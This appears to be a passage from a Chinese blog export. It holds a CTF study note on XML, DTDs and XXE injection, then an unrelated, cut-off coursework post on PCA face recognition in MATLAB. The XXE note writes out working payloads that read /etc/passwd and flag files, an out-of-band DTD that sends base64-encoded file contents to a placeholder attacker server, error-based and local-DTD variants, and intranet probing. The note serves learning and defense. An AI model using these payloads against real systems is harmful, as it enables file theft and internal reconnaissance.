        <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><div class="note info flat"><p><strong>XML（Extensible Markup Language）</strong>是一种广泛使用的标记语言，它设计用于存储和传输数据。XML提供了一种既有结构又灵活的方式来描述数据和数据之间的关系，使其在各种应用程序和网络服务中都非常有用。它是自描述的，这意味着标签本身就能描述数据的内容。</p></div><h3 id="XML与HTML间的区别"><a href="#XML与HTML间的区别" class="headerlink" title="XML与HTML间的区别"></a>XML与HTML间的区别</h3><ol><li>XML被设计为<strong>传输和存储数据</strong>，其焦点是数据的内容</li><li>HTML被设计用来<strong>显示数据</strong>，其焦点是数据的外观</li><li>HTML旨在显示信息，而XML旨在传输信息</li></ol><h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--DTD，这部分可选的--&gt;          </span><br><span class="line">&lt;!DOCTYPE bookstore [</span><br><span class="line">  &lt;!ELEMENT bookstore (book+)&gt;</span><br><span class="line">  &lt;!ELEMENT book (title, author, year, price)&gt;</span><br><span class="line">  &lt;!ATTLIST book category CDATA #REQUIRED&gt;</span><br><span class="line">  &lt;!ELEMENT title (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT year (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT price (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;                                                           &lt;bookstore&gt;</span><br><span class="line">  &lt;book category=&quot;cooking&quot;&gt;</span><br><span class="line">    &lt;title&gt;Everyday Italian&lt;/title&gt;</span><br><span class="line">    &lt;author&gt;Giada De Laurentiis&lt;/author&gt;</span><br><span class="line">    &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">    &lt;price&gt;30.00&lt;/price&gt;</span><br><span class="line">  &lt;/book&gt;</span><br><span class="line">  &lt;book category=&quot;children&quot;&gt;</span><br><span class="line">    &lt;title&gt;Harry Potter&lt;/title&gt;</span><br><span class="line">    &lt;author&gt;J.K. Rowling&lt;/author&gt;</span><br><span class="line">    &lt;year&gt;2005&lt;/year&gt;</span><br><span class="line">    &lt;price&gt;29.99&lt;/price&gt;</span><br><span class="line">  &lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><div class="note info flat"><p>XML的<strong>DTD（Document Type Definition）</strong>是一种用于定义XML文档结构的规范，它指定了文档中允许的元素、属性、实体和符合规范的XML文档应遵循的其他规则。</p></div><p>DTD可以存在于XML文档内部（内部DTD），也可以作为一个独立的外部文件（外部DTD）被多个XML文档共享。</p><h3 id="主要组件"><a href="#主要组件" class="headerlink" title="主要组件"></a>主要组件</h3><ol><li><p><strong>元素声明</strong>：定义文档中可以使用哪些元素以及这些元素的内容类型。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT book (title, author, year, price)&gt;</span><br></pre></td></tr></table></figure><p>这表示每个 <code>&lt;book&gt;</code> 元素必须包含一个 <code>&lt;title&gt;</code>、一个 <code>&lt;author&gt;</code>、一个 <code>&lt;year&gt;</code> 和一个 <code>&lt;price&gt;</code>。</p></li><li><p><strong>属性声明</strong>：定义元素可以拥有的属性及其类型。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST book category CDATA #REQUIRED&gt;</span><br></pre></td></tr></table></figure><p>这表示 <code>&lt;book&gt;</code> 元素必须有一个 <code>category</code> 属性，其类型为字符数据（CDATA），并且该属性是必需的。</p></li><li><p><strong>实体声明</strong>：定义常用数据的缩写。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY publisher &quot;John Wiley &amp; Sons&quot;&gt;</span><br></pre></td></tr></table></figure><p>这允许在文档中多次引用 <code>publisher</code> 实体，而不是重复相同的文本。</p></li></ol><h3 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h3><p>在XXE漏洞利用中，我们主要关注DTD中的实体声明方式</p><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>内部实体可以理解为<strong>将特定的文本字符串赋值给一个名称</strong>，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY name &quot;R1ck&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;a&lt;/note&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体引用外部资源，比如文件或是Web资源。这些实体的声明指向资源的URI。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY flag SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;flag&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p><img src="/posts/f41e16b8b181/1270588-20200115235522292-2141935835.png" class="" title="img"><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p>参数实体也可以分为内部和外部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 内部参数实体 --&gt;</span><br><span class="line">&lt;!ENTITY % entityName &quot;entityValue&quot;&gt;</span><br><span class="line">&lt;!-- 内部参数实体 --&gt;</span><br><span class="line">&lt;!ENTITY % entityName SYSTEM &quot;http://127.0.0.1/xml.dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>在DTD中引用参数实体时，使用 <code>%</code> 符号，并跟上实体的名称和分号，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%entityName;</span><br></pre></td></tr></table></figure><p>下面给出一个完整示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % commonAttrs &quot;id ID #REQUIRED author CDATA #IMPLIED&quot;&gt;</span><br><span class="line">&lt;!ELEMENT book (%commonAttrs;)&gt;</span><br><span class="line">&lt;!ELEMENT magazine (%commonAttrs;)&gt;</span><br><span class="line">&lt;!ELEMENT article (%commonAttrs;)&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是参数实体与其他实体间<strong>在声明和引用方法上的区别</strong></p><ul><li>参数实体用<code>% name</code>声明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>声明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ul><li>DTD语法相对简单，不能定义一些更复杂的数据类型和约束。</li><li>不支持命名空间，这在处理来自不同来源的XML数据时可能会导致问题。</li><li>可能容易受到某些类型的XML攻击，如XML注入攻击。</li></ul><p>尽管XML Schema（XSD）提供了比DTD更复杂和功能丰富的数据验证工具，但DTD仍然因其简单性和广泛的支持而被广泛使用。</p><h2 id="XML外部实体注入-XML-External-Entity"><a href="#XML外部实体注入-XML-External-Entity" class="headerlink" title="XML外部实体注入(XML External Entity)"></a>XML外部实体注入(XML External Entity)</h2><p>XML 外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。</p><p>XXE为什么不叫XEE，主要是第二个单词<code>External</code>也发<code>x</code>的音</p><p>我们可以根据XEE漏洞的危害场景来分类利用方法，XXE 可以用来泄露文件、执行服务器端请求伪造（SSRF）、内网探测、执行远程代码以及拒绝服务攻击等</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>XXE 最常见的利用方式之一是访问本地文件，从而泄露敏感信息。攻击者可以通过定义外部实体来访问系统文件</p><p>当然，在任意文件读取场景下，还可以细分为有回显和无回显</p><h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><ol><li><p>恶意引入外部实体</p><p>通过引入靶机的本地文件作为外部实体，可以直接读取靶机文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">    &lt;!ENTITY rabbit SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></li><li><p>恶意引入外部参数实体</p><p>我们也可以提前在dtd文件中将常见的敏感目录定义为外部实体，再通过外部参数实体引入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure></li></ol><h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><ol><li><p><strong>OOB</strong></p><p>先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p><div class="note info flat"><p>在XML中，当使用字符实体引用来表示特殊字符或者Unicode字符时，语法要求使用分号（<code>;</code>）来结束实体引用。</p></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></li><li><p><strong>基于报错</strong></p><p>当然，如果靶机不允许与其他服务器通信，我们也可以通过报错来读取文件</p><p>与刚刚OOB的方法上只用细微的差别，即远程传输的url处构造一个错误的url</p><p>示例如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>如果靶机防火墙不允许我们请求外网服务器DTD，可以尝试在靶机的已知DTD文件中新增一些实体内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;send;</span><br><span class="line">&#x27;&gt; </span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>已知/usr/share/yelp/dtd/docbookx.dtd文件中会调用%ISOamso，继而调用eval和send</p></li></ol><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>将URI改成内网机器地址，我们就可以探测靶机内网中的主机和文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><h3 id="XXE黑盒发现"><a href="#XXE黑盒发现" class="headerlink" title="XXE黑盒发现"></a>XXE黑盒发现</h3><ol><li>当Content-Type或数据类型为xml时，尝试进行xml语言payload测试</li><li><p>即使Content-Type或数据类型不为xml，我们也可以尝试使用xml语言payload测试</p></li><li><p>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE payload被执行。例如svg和excel引用</p></li></ol><h3 id="XXE白盒发现"><a href="#XXE白盒发现" class="headerlink" title="XXE白盒发现"></a>XXE白盒发现</h3><ol><li>在php源码中搜索处理XML的函数</li><li>追踪经常涉及到XML的功能</li></ol><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><ol><li>禁用外部实体</li><li>过滤用户提交的XML数据</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 人脸识别大作业</title>
      <link href="/posts/363598081c25/"/>
      <url>/posts/363598081c25/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>给定一个人脸图像数据库和一个新的测试图像，我们如何才能直到测试图像包含了数据库中哪一个人的人脸</p><p>我们能想到的最简单的方法即计算测试图像与数据库中每一张人脸图像之间的SSD，找出差异最小的那张人脸</p><div class="note info flat"><p><strong>SSD(Sum of Squared Differences)</strong>，即平方差之和。这是一种常用于图像匹配和动作跟踪的技术。SSD通过计算两个图像或图像区域之间的像素强度差的平方和来衡量它们的相似性。数值越小，表示两个图像或区域越相似。SSD经常用于特征匹配、立体视觉和图像配准等领域，是一种简单而有效的方法来评估图像间的差异。</p></div><p>但这种方法显然存在很多问题，当我们比对两张人脸时，不能单单是比较图像的像素点是否一样</p><p>人脸识别领域存在着许多挑战：</p><ol><li><strong>位置</strong>：人脸的图像可能并不在图像的正中心，此时我们比对两张图像的差异毫无意义</li><li><strong>大小与角度</strong>：人脸与摄影机直接的距离和角度会导致同一个人拍摄的人脸图像也有很大的变化量</li><li><strong>光照</strong>：光照条件的变化可以显著改变人脸的外观以及灰度值</li><li><strong>表情</strong>：不同的表情可以改变面部特征的外观</li><li><strong>年龄</strong>：随着时间的推移，人的面部特征会发生变化</li><li><strong>面部配饰</strong>：眼睛、胡子、围巾、耳环和发型的变化</li></ol><p>那么我们显然需要比较不同图像中人脸的特征来判断身份</p><p>分析人脸特征有以下两种方法：</p><ol><li><strong>检测可见的特征</strong>，例如眼睛、鼻子、嘴、脸颊、下巴、眉毛等。但是<strong>这种方法并不健壮</strong></li><li><strong>统计整体方法</strong>：使用统计方法提取特征。这些特征不一定有物理上的解释</li></ol><p>而传统数字图像处理领域的人脸识别方法即基于统计整体方法</p><p>下面会介绍两种方法：<strong>PCA</strong>人脸识别算法和<strong>Eigenfaces</strong>人脸识别算法</p><h2 id="PCA"><a href="#PCA" class="headerlink" title="PCA"></a>PCA</h2><p>PCA也叫做主成分分析算法</p><p><strong>主要思想</strong>：将n维特征映射到k维上，这k维是全新的正交特征也被称为主成分，是在原有n维特征的基础上重新构造出来的k维特征。</p><p>主要流程如下</p><ol><li><p><strong>计算均值</strong>：对所有样本数据计算均值。</p><script type="math/tex; mode=display">\bar{x} = \frac{1}{N} \sum_{i=1}^{N} x_i</script></li><li><p><strong>去均值化（中心化）</strong>：每个样本减去均值，以确保数据以0为中心。</p><script type="math/tex; mode=display">x_i = x_i - \bar{x}</script></li><li><p><strong>计算协方差矩阵</strong>：计算去均值化后数据的协方差矩阵。</p><script type="math/tex; mode=display">C = \frac{1}{N-1} \sum_{i=1}^{N} (x_i - \bar{x})(x_i - \bar{x})^\top</script></li><li><p><strong>求解特征值和特征向量</strong>：计算协方差矩阵的特征值和特征向量。</p><script type="math/tex; mode=display">CV = V\Lambda</script></li><li><p><strong>选择主要成分</strong>：根据特征值的大小选择最重要的特征向量。</p><script type="math/tex; mode=display">\hat{V}_k = V(:,1:k)</script></li><li><p><strong>投影数据</strong>：将原始数据投影到选定的主成分上。</p><script type="math/tex; mode=display">\alpha_{ik} = \hat{V}_k^\top x_i</script></li></ol><h2 id="Eigenfaces"><a href="#Eigenfaces" class="headerlink" title="Eigenfaces"></a>Eigenfaces</h2><p>Eigenfaces基于PCA算法，也就是是PCA在人脸识别领域的应用</p><p>EigenFace方法利用PCA得到人脸分布的主要成分，具体实现是对训练集中所有人脸图像的协方差矩阵进行本征值分解，得对对应的本征向量，这些本征向量（特征向量）就是“特征脸”。每个特征向量或者特征脸相当于捕捉或者描述人脸之间的一种变化或者特性。这就意味着<strong>每个人脸都可以表示为这些特征脸的线性组合</strong>。</p><h1 id="HW-PCA人脸识别"><a href="#HW-PCA人脸识别" class="headerlink" title="HW PCA人脸识别"></a>HW PCA人脸识别</h1><p>作业要求：</p><blockquote><ol><li><p>算法PCA人脸识别或Eigenfaces人脸识别（见人脸识别课件） </p></li><li><p>采用数据库为剑桥大学ORL人脸数据库，包含40个人的400张人脸图像（每人对应10张），图像为92x112灰度图像（256灰度级），数据库：由主讲教师提供。 </p></li><li><p>对于每个人的10张图像，随机选择5张用来训练，另外5张用于测试。对于每人的5张训练图像，可以将5张训练图像平均后作为一个特征图像再进行PCA特征抽取。 </p></li><li><p>选择合适的特征维数，建议为50-100；采用2范数（欧式距离）最小匹配。 </p></li><li><p>对每个人的另外5张训练图像分别测试，共测试5x40个图像，计算识别系统的正确率 =（识别正确的图像数）/200。 </p></li><li><p>可以使用Matlab或Python的工具库。 </p></li></ol></blockquote><h2 id="处理数据集"><a href="#处理数据集" class="headerlink" title="处理数据集"></a>处理数据集</h2><p>首先我们需要先读取数据集并将图像矩阵与对应标签绑定</p><p>初始化训练集和测试集的数组</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">datasetPath = <span class="string">&#x27;att_faces/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 初始化训练集和测试集</span></span><br><span class="line">trainSet = [];</span><br><span class="line">testSet = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加载数据集</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">40</span></span><br><span class="line">    directory = sprintf(<span class="string">&#x27;%ss%d/&#x27;</span>, datasetPath, <span class="built_in">i</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:<span class="number">10</span></span><br><span class="line">        filename = sprintf(<span class="string">&#x27;%s%d.pgm&#x27;</span>, directory, <span class="built_in">j</span>);</span><br><span class="line">        image = double(imread(filename));</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">j</span> &lt;= <span class="number">5</span></span><br><span class="line">            trainSet(:, :, <span class="keyword">end</span> + <span class="number">1</span>) = image;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            testSet(:, :, <span class="keyword">end</span> + <span class="number">1</span>) = image;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，我们<strong>还需要移除声明数组时自动创建的第一个空元素</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trainSet(:, :, <span class="number">1</span>) = [];</span><br><span class="line">testSet(:, :, <span class="number">1</span>) = []; </span><br></pre></td></tr></table></figure><h2 id="提取特征（主成分分析）"><a href="#提取特征（主成分分析）" class="headerlink" title="提取特征（主成分分析）"></a>提取特征（主成分分析）</h2><p>使用PCA算法是人脸识别中最关键的一步</p><p>在提取特征前，我们需要将同一人脸的5张训练图像<strong>平均后作为1个特征图像</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">avgImages = <span class="built_in">zeros</span>(<span class="built_in">size</span>(trainSet, <span class="number">1</span>), <span class="built_in">size</span>(trainSet, <span class="number">2</span>), <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="number">40</span></span><br><span class="line">    avgImages(:, :, <span class="built_in">i</span>) = <span class="built_in">mean</span>(trainSet(:, :, (<span class="built_in">i</span><span class="number">-1</span>)*<span class="number">5</span> + <span class="number">1</span>:<span class="built_in">i</span>*<span class="number">5</span>), <span class="number">3</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>我们使用平均方法<code>mean()</code>来获取平均矩阵</p><p>接下来则是<strong>PCA算法</strong>的流程</p><ol><li><p><strong>计算均值</strong>：<script type="math/tex">\bar{x} = \frac{1}{N} \sum_{i=1}^{N} x_i</script></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meanImage = <span class="built_in">mean</span>(avgImages, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>由于所给的图像已经是灰度图像，所以这一步其实可有可无</p></li><li><p><strong>去均值化（中心化）</strong>：每个样本减去均值，以确保数据以0为中心。</p><script type="math/tex; mode=display">x_i = x_i - \bar{x}</script><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shiftedImages = avgImages - <span class="built_in">repmat</span>(meanImage, [<span class="number">1</span>, <span class="number">1</span>, <span class="built_in">size</span>(avgImages, <span class="number">3</span>)]);</span><br></pre></td></tr></table></figure><p><code>repmat()</code>方法用于将meanImage数组的大小扩增到与avgImages一致</p></li><li><p><strong>计算协方差矩阵</strong>：计算去均值化后数据的协方差矩阵。</p><script type="math/tex; mode=display">C = \frac{1}{N-1} \sum_{i=1}^{N} (x_i - \bar{x})(x_i - \bar{x})^\top</script><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">covarianceMatrix = cov(flatImages&#x27;);</span><br></pre></td></tr></table></figure><p>使用matlab自带的<code>cov()</code>方法来计算协方差矩阵</p></li><li><p><strong>求解特征值和特征向量</strong>：计算协方差矩阵的特征值和特征向量。</p><script type="math/tex; mode=display">CV = V\Lambda</script><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx1 <span class="number">1</span>[eigenVectors, eigenValues] = eig(covarianceMatrix);</span><br></pre></td></tr></table></figure><p>使用matlab自带的<code>eig()</code>方法来计算特征向量与特征值</p></li><li><p><strong>选择主要成分</strong>：根据特征值的大小选择特征向量。</p><script type="math/tex; mode=display">\hat{V}_k = V(:,1:k)</script><p>我们先将得到的<strong>特征值排序</strong>，选出最靠前的特征值大的k个特征向量</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[~, sortedIndices] = <span class="built_in">sort</span>(<span class="built_in">diag</span>(eigenValues), <span class="string">&#x27;descend&#x27;</span>);</span><br><span class="line">eigenVectors = eigenVectors(:, sortedIndices);</span><br><span class="line">eigenVectors = eigenVectors(:, <span class="number">1</span>:k); </span><br></pre></td></tr></table></figure></li></ol><h2 id="投影数据到特征空间"><a href="#投影数据到特征空间" class="headerlink" title="投影数据到特征空间"></a>投影数据到特征空间</h2><p>由于测试数据后续要与训练集进行模板匹配，所以需要一起投影到特征空间</p><p>这里我们定义一个投影的函数</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">projectedImages</span> = <span class="title">projectToPCASpace</span><span class="params">(images, meanImage, eigenVectors)</span></span></span><br><span class="line">    